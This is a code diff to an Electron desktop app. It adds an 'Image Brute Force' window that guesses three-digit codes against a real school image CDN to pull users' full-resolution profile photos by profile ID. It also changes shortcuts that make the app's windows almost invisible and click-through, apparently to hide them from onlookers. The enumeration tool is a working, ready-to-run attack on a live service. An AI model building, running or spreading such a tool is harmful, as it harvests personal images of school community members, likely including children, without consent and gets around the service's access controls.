@@ -2,7 +2,7 @@ const { app, BrowserWindow, session, globalShortcut, ipcMain, dialog, nativeImag
 const fs = require("fs");
 const path = require("path");
 
-let mainWindow, leAIWindow;
+let mainWindow, leAIWindow, imgBruteForceWindow;
 let opacityLevel = 1.0;
 let launchUrl = "https://thatoneweirddev.github.io/arch/";
 let isHidden = false;
@@ -220,6 +220,167 @@ const createLEAIWindow = () => {
   });
 };
 
+const createImgBruteForceWindow = () => {
+  if (imgBruteForceWindow) {
+    imgBruteForceWindow.focus();
+    return;
+  }
+
+  imgBruteForceWindow = new BrowserWindow({
+    width: 360,
+    height: 480,
+    x: 100,
+    y: 100,
+    resizable: false,
+    alwaysOnTop: true,
+    frame: true,
+    webPreferences: {
+      nodeIntegration: true,
+      contextIsolation: false,
+      devTools: true
+    },
+  });
+
+  const bruteForceHTML = `
+    <html>
+    <head>
+      <title>Image Brute Force</title>
+      <style>
+        body {
+          font-family: Arial, sans-serif;
+          margin: 15px;
+          user-select: none;
+          background: white;
+          color: #333;
+        }
+        label {
+          font-weight: bold;
+          display: block;
+          margin-bottom: 6px;
+        }
+        input[type=text] {
+          width: 100%;
+          padding: 6px;
+          margin-bottom: 10px;
+          font-size: 14px;
+          box-sizing: border-box;
+        }
+        button {
+          width: 100%;
+          padding: 8px;
+          font-weight: bold;
+          border: none;
+          border-radius: 4px;
+          cursor: pointer;
+          color: #fff;
+          margin-top: 6px;
+        }
+        #startBtn {
+          background: #28a745;
+          margin-top: 0;
+        }
+        #clearBtn {
+          background: #dc3545;
+        }
+        #status {
+          margin-top: 10px;
+          font-size: 14px;
+          min-height: 22px;
+          color: #333;
+        }
+        #imgDisplay {
+          margin-top: 10px;
+          text-align: center;
+        }
+        #imgDisplay img {
+          max-width: 300px;
+          max-height: 300px;
+        }
+      </style>
+    </head>
+    <body>
+      <label for="profileIdInput">Profile ID:</label>
+      <input id="profileIdInput" type="text" placeholder="e.g. 6868120" />
+      <button id="startBtn">Start Search</button>
+      <button id="clearBtn">Clear</button>
+      <div id="status"></div>
+      <div id="imgDisplay"></div>
+
+      <script>
+        const batchSize = 40;
+        const max = 999;
+        const base = "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/888/user/large_user_";
+        const extLow = ".jpg?resize=75,75";
+
+        let found = false;
+
+        const status = document.getElementById("status");
+        const imgDisplay = document.getElementById("imgDisplay");
+        const profileInput = document.getElementById("profileIdInput");
+        const startBtn = document.getElementById("startBtn");
+        const clearBtn = document.getElementById("clearBtn");
+
+        const clearResults = () => {
+          found = false;
+          status.textContent = "";
+          imgDisplay.innerHTML = "";
+        };
+
+        const launchBatch = (start, id) => {
+          for (let i = start; i < start + batchSize && i <= max; i++) {
+            const code = i.toString().padStart(3, "0");
+            const url = \`\${base}\${id}_\${code}\${extLow}\`;
+            const img = new Image();
+            img.src = url;
+            img.onload = () => {
+              if (!found) {
+                found = true;
+                const highResUrl = url.replace("resize=75,75", "resize=999,999");
+                const highImg = new Image();
+                highImg.src = highResUrl;
+                imgDisplay.innerHTML = "";
+                imgDisplay.appendChild(highImg);
+                status.textContent = \`Image found: code \${code}\`;
+              }
+            };
+          }
+          if (!found && start + batchSize <= max) {
+            status.textContent = \`Searching codes \${start} to \${start + batchSize - 1}...\`;
+            requestAnimationFrame(() => launchBatch(start + batchSize, id));
+          }
+          if (!found && start + batchSize > max) {
+            status.textContent = "No image found.";
+          }
+        };
+
+        startBtn.onclick = () => {
+          clearResults();
+          const id = profileInput.value.trim();
+          if (!id) {
+            status.textContent = "Please enter a Profile ID.";
+            return;
+          }
+          status.textContent = "Starting search...";
+          launchBatch(0, id);
+        };
+
+        clearBtn.onclick = () => {
+          clearResults();
+          profileInput.value = "";
+          status.textContent = "Cleared.";
+        };
+      </script>
+    </body>
+    </html>
+  `;
+
+  imgBruteForceWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(bruteForceHTML)}`);
+
+  imgBruteForceWindow.on('closed', () => {
+    imgBruteForceWindow = null;
+  });
+};
+
 app.setAsDefaultProtocolClient("arch");
 
 app.on("open-url", (event, url) => {
@@ -268,14 +429,14 @@ app.whenReady().then(() => {
   });
 
   globalShortcut.register("CommandOrControl+Option+-", () => {
-    opacityLevel = Math.max(opacityLevel - 0.05, 0.02);
+    opacityLevel = Math.max(opacityLevel - 0.05, 0.2);
     if (!isHidden) {
       if (mainWindow) mainWindow.setOpacity(opacityLevel);
       if (leAIWindow) leAIWindow.setOpacity(opacityLevel);
     }
   });
 
-  globalShortcut.register("Command+H", () => {
+  globalShortcut.register("CommandOrControl+Option+H", () => {
     if (!isHidden) {
       if (mainWindow) {
         mainWindow.setOpacity(0);
@@ -286,52 +447,32 @@ app.whenReady().then(() => {
         leAIWindow.setIgnoreMouseEvents(true);
       }
       isHidden = true;
-    }
-  });
-
-  globalShortcut.register("CommandOrControl+Option+B", async () => {
-    const choice = await dialog.showMessageBox({
-      type: "question",
-      buttons: ["Use Default", "Upload Custom"],
-      title: "Background Preference",
-      message: "Choose a background option:",
-      cancelId: 2
-    });
-
-    if (choice.response === 0) {
-      saveSettings({ useCustom: false });
-    } else if (choice.response === 1) {
-      const result = await dialog.showOpenDialog({
-        title: "Select Background Image",
-        properties: ["openFile"],
-        filters: [{ name: "Images", extensions: ["jpg", "jpeg", "png"] }]
-      });
-
-      if (!result.canceled && result.filePaths.length > 0) {
-        fs.copyFileSync(result.filePaths[0], customBgPath);
-        saveSettings({ useCustom: true });
-      }
-    }
-  });
-
-  globalShortcut.register("CommandOrControl+I", () => {
-    if (!leAIWindow) {
-      createLEAIWindow();
     } else {
-      if (isHidden) {
-        leAIWindow.setOpacity(opacityLevel);
-        leAIWindow.setIgnoreMouseEvents(false);
-        isHidden = false;
+      if (mainWindow) {
+        mainWindow.setIgnoreMouseEvents(false);
+        mainWindow.setOpacity(opacityLevel);
       }
-      leAIWindow.show();
+      if (leAIWindow) {
+        leAIWindow.setIgnoreMouseEvents(false);
+        leAIWindow.setOpacity(opacityLevel);
+      }
+      isHidden = false;
     }
   });
 
-  mainWindow?.on("close", () => {
-    mainWindow.webContents.executeJavaScript('document.getElementById("webview")?.remove();');
+  // Removed CommandOrControl+Option+B shortcut for background toggle
+
+  globalShortcut.register("Command+Option+P", () => {
+    createImgBruteForceWindow();
   });
+
+  createLEAIWindow();
 });
 
-app.on("will-quit", () => {
-  globalShortcut.unregisterAll();
+app.on("window-all-closed", () => {
+  if (process.platform !== "darwin") app.quit();
+});
+
+app.on("activate", () => {
+  if (BrowserWindow.getAllWindows().length === 0) createMainWindow();
 });
